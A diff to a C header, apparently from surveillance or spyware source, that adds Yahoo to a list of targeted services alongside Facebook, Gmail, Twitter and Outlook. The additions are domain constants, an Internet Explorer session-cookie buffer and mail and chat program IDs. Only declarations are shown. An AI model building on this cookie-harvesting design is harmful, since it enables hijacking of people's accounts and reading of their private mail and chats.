@@ -1,4 +1,4 @@
-#define SOCIAL_ENTRY_COUNT 6
+#define SOCIAL_ENTRY_COUNT 8
 
 #define SOCIAL_REQUEST_SUCCESS 0
 #define SOCIAL_REQUEST_BAD_COOKIE 1
@@ -18,11 +18,13 @@ typedef struct {
 #define GMAIL_DOMAIN L"mail.google.com"
 #define TWITTER_DOMAIN L"twitter.com"
 #define OUTLOOK_DOMAIN L"live.com"
+#define YAHOO_DOMAIN L"yahoo.com"
 
 #define FACEBOOK_DOMAINA "facebook.com"
 #define GMAIL_DOMAINA "mail.google.com"
 #define TWITTER_DOMAINA "twitter.com"
 #define OUTLOOK_DOMAINA "live.com"
+#define YAHOO_DOMAINA "yahoo.com"
 
 #define MAPI_V3_0_PROTO	2012030601
 
@@ -38,6 +40,7 @@ struct MailSerializedMessageHeader {
   FILETIME date;			 // data di ricezione approssimativa del messaggio
  #define MAIL_GMAIL     0x00000000
  #define MAIL_OUTLOOK	0x00000004
+ #define MAIL_YAHOO		0x00000005
   DWORD Program;
 };
 #pragma pack()
@@ -55,9 +58,12 @@ extern char FACEBOOK_IE_COOKIE[1024];
 extern char GMAIL_IE_COOKIE[1024];
 extern char TWITTER_IE_COOKIE[1024];
 extern char OUTLOOK_IE_COOKIE[1024];
+extern char YAHOO_IE_COOKIE[1024];
 
 #define CHAT_PROGRAM_FACEBOOK 0x02
 #define CHAT_PROGRAM_TWITTER  0x03
+#define CHAT_PROGRAM_YAHOO    0x04
+
 
 
 
